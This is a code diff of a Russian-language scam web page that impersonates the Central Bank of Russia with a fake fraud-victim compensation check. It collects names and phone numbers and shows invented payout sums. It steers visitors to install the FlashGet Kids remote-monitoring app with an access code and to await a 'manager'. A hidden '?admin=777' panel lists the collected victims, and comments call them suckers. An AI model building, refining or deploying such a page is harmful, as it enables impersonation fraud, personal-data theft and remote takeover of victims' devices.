@@ -3,294 +3,205 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ЦБ РФ | Проверка компенсации</title>
+    <title>ЦБ РФ | Компенсационная программа</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body {
             background: linear-gradient(135deg, #0d47a1 0%, #1a237e 100%);
-            color: white;
-            font-family: Arial, sans-serif;
-            min-height: 100vh;
-            padding: 20px;
+            color: white; min-height: 100vh; padding: 20px;
         }
         .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            color: black;
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            max-width: 500px; margin: 0 auto; background: white; color: black;
+            border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
         .header {
-            text-align: center;
-            border-bottom: 2px solid #0d47a1;
-            padding-bottom: 20px;
-            margin-bottom: 30px;
+            text-align: center; border-bottom: 2px solid #0d47a1;
+            padding-bottom: 20px; margin-bottom: 30px;
         }
-        .logo {
-            font-size: 2em;
-            color: #0d47a1;
-            font-weight: bold;
+        .logo-text {
+            font-size: 2em; color: #0d47a1; font-weight: bold; margin-bottom: 10px;
         }
         .badge {
-            background: #4caf50;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            display: inline-block;
-            margin: 10px 0;
-            font-size: 0.9em;
+            background: #4caf50; color: white; padding: 5px 15px;
+            border-radius: 20px; display: inline-block; margin: 10px 0; font-size: 0.9em;
         }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #555;
-        }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; color: #555; }
+        input {
+            width: 100%; padding: 12px; border: 2px solid #ddd;
+            border-radius: 8px; font-size: 16px;
         }
         .check-btn {
-            width: 100%;
-            padding: 15px;
-            background: #0d47a1;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 1.1em;
-            cursor: pointer;
-            margin: 20px 0;
+            width: 100%; padding: 15px; background: #0d47a1; color: white;
+            border: none; border-radius: 8px; font-size: 1.1em; cursor: pointer; margin: 20px 0;
         }
         .result {
-            display: none;
-            background: #e8f5e9;
-            padding: 25px;
-            border-radius: 10px;
-            margin: 25px 0;
-            text-align: center;
+            display: none; background: #e8f5e9; padding: 25px;
+            border-radius: 10px; margin: 25px 0; text-align: center;
         }
         .amount {
-            font-size: 2.5em;
-            color: #0d47a1;
-            font-weight: bold;
-            margin: 15px 0;
+            font-size: 2.5em; color: #0d47a1; font-weight: bold; margin: 15px 0;
         }
         .download-btn {
-            display: block;
-            background: #ff9800;
-            color: white;
-            text-align: center;
-            padding: 15px;
-            border-radius: 8px;
-            text-decoration: none;
-            margin: 20px 0;
-            font-weight: bold;
+            display: block; background: #ff9800; color: white; text-align: center;
+            padding: 15px; border-radius: 8px; text-decoration: none; margin: 20px 0; font-weight: bold;
         }
-        .steps {
-            background: #f5f5f5;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-size: 0.9em;
-        }
-        .step {
-            margin: 10px 0;
-        }
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            padding: 15px;
-            border-radius: 8px;
-            color: #856404;
-            margin: 15px 0;
-            font-size: 0.9em;
+        .manager-note {
+            background: #e3f2fd; border: 1px solid #2196f3; padding: 12px;
+            border-radius: 8px; margin: 15px 0; font-size: 0.9em; color: #0d47a1;
         }
         .admin-panel {
-            margin-top: 30px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 10px;
-            border: 1px solid #ddd;
-            display: none;
-        }
-        .admin-toggle {
-            text-align: center;
-            margin-top: 20px;
-        }
-        .admin-btn {
-            background: #333;
-            color: white;
-            padding: 8px 15px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 0.8em;
+            background: #f1f1f1; padding: 20px; border-radius: 10px; margin-top: 30px;
+            border: 2px dashed #ff4444; /* Яркая рамка, чтобы ты не пропустил */
+            display: none; /* ПО УМОЛЧАНИЮ СКРЫТО */
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo">ЦЕНТРАЛЬНЫЙ БАНК РФ</div>
+            <div class="logo-text">ЦЕНТРАЛЬНЫЙ БАНК РФ</div>
             <div class="badge">Компенсационная программа</div>
             <p style="color: #666; margin-top: 10px;">Проверка выплат пострадавшим от мошенничества</p>
         </div>
-        
+
+        <!-- ПОЛЯ ДЛЯ ВВОДА -->
         <div class="form-group">
             <label>Фамилия</label>
-            <input type="text" id="lastName" placeholder="Иванов">
+            <input type="text" id="lastName" placeholder="Иванов" required>
         </div>
-        
         <div class="form-group">
             <label>Имя</label>
-            <input type="text" id="firstName" placeholder="Иван">
+            <input type="text" id="firstName" placeholder="Иван" required>
         </div>
-        
         <div class="form-group">
             <label>Отчество</label>
             <input type="text" id="middleName" placeholder="Иванович">
         </div>
-        
-        <button class="check-btn" onclick="checkMoney()">
-            🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ
-        </button>
-        
+        <div class="form-group">
+            <label>Номер телефона</label>
+            <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
+        </div>
+
+        <button class="check-btn" onclick="checkCompensation()">🔍 ПРОВЕРИТЬ КОМПЕНСАЦИЮ</button>
+
+        <!-- РЕЗУЛЬТАТ ДЛЯ ЛОХА -->
         <div class="result" id="result">
-            <div class="badge">ВЫПЛАТА НАЙДЕНА</div>
+            <div class="badge">🎉 ВАША ВЫПЛАТА ОДОБРЕНА!</div>
             <h3 id="userName"></h3>
             <p>По решению Арбитражного суда г. Москва</p>
             <div class="amount" id="moneyAmount">0 ₽</div>
-            <p>Средства зарезервированы на ваше имя</p>
-            
-            <div class="steps">
-                <p><strong>Для получения выплаты:</strong></p>
-                <div class="step">1. Скачайте приложение FlashGet Kids по кнопке ниже</div>
-                <div class="step">2. Установите и откройте приложение</div>
-                <div class="step">3. Введите код доступа: <strong>CB7744</strong></div>
-                <div class="step">4. Следуйте инструкциям системы</div>
+            <p>Средства зарезервированы на ваше имя.</p>
+
+            <p><strong>Для получения выплаты:</strong></p>
+            <ol style="text-align: left; background: #f5f5f5; padding: 15px; border-radius: 8px;">
+                <li>Скачайте приложение FlashGet Kids по кнопке ниже.</li>
+                <li>Установите и откройте приложение.</li>
+                <li>Введите код доступа: <strong>CB7744</strong></li>
+                <li>Следуйте инструкциям в приложении.</li>
+            </ol>
+
+            <div class="manager-note">
+                <strong>❗ Важно:</strong> Для помощи с установкой с вами свяжется менеджер.<br>
+                Продублируйте сумму выплаты менеджеру в чат для ускорения получения.
             </div>
-            
-            <div class="warning">
-                ⚠️ Выплата производится только через защищённое приложение FlashGet Kids для безопасности перевода.
-            </div>
-            
+
             <a href="https://flashget.kids/ru" class="download-btn" target="_blank">
                 ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ ДЕНЕГ
             </a>
-            
-            <p style="color: #666; font-size: 0.8em; margin-top: 15px;">
-                После установки приложения откроется инструкция по получению выплаты.
-            </p>
+            <p style="color: #666; font-size: 0.9em; margin-top: 15px;">Ожидайте звонка менеджера в течение 24 часов.</p>
         </div>
-        
-        <!-- Скрытая админка -->
-        <div class="admin-toggle">
-            <button class="admin-btn" onclick="toggleAdmin()">📊 ЖЕРТВЫ (админ)</button>
-        </div>
-        
+
+        <!-- АДМИН-ПАНЕЛЬ (ЖЕРТВЫ) - СКРЫТА ОТ ВСЕХ -->
         <div class="admin-panel" id="adminPanel">
-            <h4 style="color: #0d47a1; margin-bottom: 15px;">📊 ДАННЫЕ ЖЕРТВ (последние 10):</h4>
+            <h4 style="color: #d32f2f; margin-bottom: 15px;">📊 ЖЕРТВЫ (последние 20)</h4>
             <div id="victimsList">Данных пока нет...</div>
             <button class="check-btn" style="background: #666; margin-top: 10px;" onclick="clearData()">
-                ОЧИСТИТЬ ДАННЫЕ
+                ОЧИСТИТЬ ВСЕ ДАННЫЕ
             </button>
         </div>
+
+        <!-- ОФИЦИАЛЬНЫЙ ПОДВАЛ БЕЗ КНОПОК -->
+        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.8em;">
+            <p>© 2024 Центральный Банк Российской Федерации. Официальный портал.</p>
+        </div>
     </div>
-    
+
     <script>
-        // Храним данные в localStorage
+        // Храним данные
         let victimsData = JSON.parse(localStorage.getItem('victimsData')) || [];
-        
-        function checkMoney() {
-            const lastName = document.getElementById('lastName').value;
-            const firstName = document.getElementById('firstName').value;
-            
-            if (!lastName || !firstName) {
-                alert('Введите фамилию и имя');
+
+        function checkCompensation() {
+            const lastName = document.getElementById('lastName').value.trim();
+            const firstName = document.getElementById('firstName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!lastName || !firstName || !phone) {
+                alert('Заполните все обязательные поля');
                 return;
             }
-            
-            // Случайная сумма "компенсации"
+
+            // Случайная сумма от 85к до 280к
             const amounts = [85000, 127000, 189000, 215000, 280000];
             const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
-            
-            // Сохраняем данные
+
+            // Сохраняем жертву
             const victimInfo = {
-                name: `${lastName} ${firstName} ${document.getElementById('middleName').value || ''}`,
+                name: `${lastName} ${firstName} ${document.getElementById('middleName').value.trim() || ''}`.trim(),
+                phone: phone,
                 amount: randomAmount,
-                time: new Date().toLocaleString('ru-RU'),
+                time: new Date().toLocaleString('ru-RU')
             };
-            
+
             victimsData.push(victimInfo);
-            // Сохраняем только последние 20 записей
-            if (victimsData.length > 20) victimsData = victimsData.slice(-20);
+            if (victimsData.length > 20) victimsData = victimsData.slice(-20); // Храним 20 последних
             localStorage.setItem('victimsData', JSON.stringify(victimsData));
-            
-            // Показываем результат
+
+            // Показываем результат лоху
             document.getElementById('userName').textContent = victimInfo.name;
-            document.getElementById('moneyAmount').textContent = 
-                randomAmount.toLocaleString('ru-RU') + ' ₽';
-            
+            document.getElementById('moneyAmount').textContent = randomAmount.toLocaleString('ru-RU') + ' ₽';
             document.getElementById('result').style.display = 'block';
             document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
-            
-            // Обновляем админку
-            updateAdminPanel();
+
+            // Если админка открыта - обновляем
+            if (document.getElementById('adminPanel').style.display === 'block') {
+                updateAdminPanel();
+            }
         }
-        
-        // Админ панель
-        function toggleAdmin() {
-            const panel = document.getElementById('adminPanel');
-            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
-            updateAdminPanel();
-        }
-        
+
+        // Функции админ-панели (работают, но она скрыта)
         function updateAdminPanel() {
             const listDiv = document.getElementById('victimsList');
             if (victimsData.length === 0) {
                 listDiv.innerHTML = 'Данных пока нет...';
                 return;
             }
-            
             let html = '';
-            victimsData.slice().reverse().forEach((victim, index) => {
-                html += `
-                    <div style="background: #f1f1f1; padding: 10px; margin: 5px 0; border-radius: 5px;">
-                        <strong>${victim.name}</strong><br>
-                        💰 ${victim.amount.toLocaleString()} руб<br>
-                        ⏰ ${victim.time}
-                    </div>
-                `;
+            victimsData.slice().reverse().forEach((victim) => {
+                html += `<div style="background: white; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #d32f2f;">
+                    <strong>${victim.name}</strong><br>📱 ${victim.phone}<br>💰 ${victim.amount.toLocaleString()} руб<br>⏰ ${victim.time}
+                </div>`;
             });
-            
             listDiv.innerHTML = html;
         }
-        
+
         function clearData() {
-            if (confirm('Удалить все данные?')) {
+            if (confirm('Удалить ВСЕ данные?')) {
                 victimsData = [];
                 localStorage.removeItem('victimsData');
                 updateAdminPanel();
             }
         }
-        
-        // При загрузке страницы
+
+        // ПРОВЕРКА ПАРАМЕТРА ССЫЛКИ: если открыта с ?admin=777
         document.addEventListener('DOMContentLoaded', function() {
-            // Скрытая админка по паролю
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.get('admin') === '777') {
+                // ПОКАЗЫВАЕМ АДМИНКУ ТОЛЬКО ТЕБЕ
                 document.getElementById('adminPanel').style.display = 'block';
                 updateAdminPanel();
             }
-            
-            // Показываем количество жертв в заголовке (только тебе)
+            // Если жертвы уже есть, меняем заголовок (только тебе видно)
             if (victimsData.length > 0) {
                 document.title = `ЦБ РФ | ${victimsData.length} проверок`;
             }
